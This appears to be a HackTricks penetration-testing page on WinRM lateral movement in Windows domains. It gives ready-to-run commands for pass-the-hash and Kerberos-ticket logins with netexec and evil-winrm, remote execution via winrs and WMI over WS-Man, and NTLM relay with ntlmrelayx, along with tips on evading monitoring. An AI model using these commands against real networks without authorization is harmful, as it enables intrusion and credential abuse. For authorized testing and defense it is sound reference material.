# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM is one of the most convenient **lateral movement** transports in Windows environments because it gives you a remote shell over **WS-Man/HTTP(S)** without needing SMB service creation tricks. If the target exposes **5985/5986** and your principal is allowed to use remoting, you can often move from "valid creds" to "interactive shell" very quickly.

For the **protocol/service enumeration**, listeners, enabling WinRM, `Invoke-Command`, and generic client usage, check:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Uses **HTTP/HTTPS** instead of SMB/RPC, so it often works where PsExec-style execution is blocked.
- With **Kerberos**, it avoids sending reusable credentials to the target.
- Works cleanly from **Windows**, **Linux**, and **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- The interactive PowerShell remoting path spawns **`wsmprovhost.exe`** on the target under the authenticated user context, which is operationally different from service-based exec.

## Access model and prerequisites

In practice, successful WinRM lateral movement depends on **three** things:

1. The target has a **WinRM listener** (`5985`/`5986`) and firewall rules that allow access.
2. The account can **authenticate** to the endpoint.
3. The account is allowed to **open a remoting session**.

Common ways to gain that access:

- **Local Administrator** on the target.
- Membership in **Remote Management Users** on newer systems or **WinRMRemoteWMIUsers__** on systems/components that still honor that group.
- Explicit remoting rights delegated through local security descriptors / PowerShell remoting ACL changes.

If you already control a box with admin rights, remember you can also **delegate WinRM access without full admin group membership** using the techniques described here:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. If you connect by IP, the client usually falls back to **NTLM/Negotiate**.
- In **workgroup** or cross-trust edge cases, NTLM commonly requires either **HTTPS** or the target to be added to **TrustedHosts** on the client.
- With **local accounts** over Negotiate in a workgroup, UAC remote restrictions may prevent access unless the built-in Administrator account is used or `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting defaults to the **`HTTP/<host>` SPN**. In environments where `HTTP/<host>` is already registered to some other service account, WinRM Kerberos may fail with `0x80090322`; use a port-qualified SPN or switch to **`WSMAN/<host>`** where that SPN exists.

If you land valid credentials during password spraying, validating them over WinRM is often the fastest way to check whether they translate into a shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM for interactive shells

`evil-winrm` remains the most convenient interactive option from Linux because it supports **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, file transfer, and in-memory PowerShell/.NET loading.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN edge case: `HTTP` vs `WSMAN`

When the default **`HTTP/<host>`** SPN causes Kerberos failures, try requesting/using a **`WSMAN/<host>`** ticket instead. This appears in hardened or odd enterprise setups where `HTTP/<host>` is already attached to another service account.

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

This is also useful after **RBCD / S4U** abuse when you specifically forged or requested a **WSMAN** service ticket rather than a generic `HTTP` ticket.

### Certificate-based authentication

WinRM also supports **client certificate authentication**, but the certificate must be mapped on the target to a **local account**. From an offensive perspective this matters when:

- you stole/exported a valid client certificate and private key already mapped for WinRM;
- you abused **AD CS / Pass-the-Certificate** to obtain a certificate for a principal and then pivot into another authentication path;
- you are operating in environments that deliberately avoid password-based remoting.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM is much less common than password/hash/Kerberos auth, but when it exists it can provide a **passwordless lateral movement** path that survives password rotation.

### Python / automation with `pypsrp`

If you need automation rather than an operator shell, `pypsrp` gives you WinRM/PSRP from Python with **NTLM**, **certificate auth**, **Kerberos**, and **CredSSP** support.

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` is built in and useful when you want **native WinRM command execution** without opening an interactive PowerShell remoting session:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Operationally, `winrs.exe` commonly results in a remote process chain similar to:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

This is worth remembering because it differs from service-based exec and from interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM instead of PowerShell remoting

You can also execute through **WinRM transport** without `Enter-PSSession` by invoking WMI classes over WS-Man. This keeps the transport as WinRM while the remote execution primitive becomes **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

That approach is useful when:

- PowerShell logging is heavily monitored.
- You want **WinRM transport** but not a classic PS remoting workflow.
- You are building or using custom tooling around the **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

When SMB relay is blocked by signing and LDAP relay is constrained, **WS-Man/WinRM** may still be an attractive relay target. Modern `ntlmrelayx.py` includes **WinRM relay servers** and can relay to **`wsman://`** or **`winrms://`** targets.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Two practical notes:

- Relay is most useful when the target accepts **NTLM** and the relayed principal is allowed to use WinRM.
- Recent Impacket code specifically handles **`WSMANIDENTIFY: unauthenticated`** requests so `Test-WSMan`-style probes do not break the relay flow.

For multi-hop constraints after landing a first WinRM session, check:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC and detection notes

- **Interactive PowerShell remoting** usually creates **`wsmprovhost.exe`** on the target.
- **`winrs.exe`** commonly creates **`winrshost.exe`** and then the requested child process.
- Expect **network logon** telemetry, WinRM service events, and PowerShell operational/script-block logging if you use PSRP rather than raw `cmd.exe`.
- If you only need a single command, `winrs.exe` or one-shot WinRM execution may be quieter than a long-lived interactive remoting session.
- If Kerberos is available, prefer **FQDN + Kerberos** over IP + NTLM to reduce both trust issues and awkward client-side `TrustedHosts` changes.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}


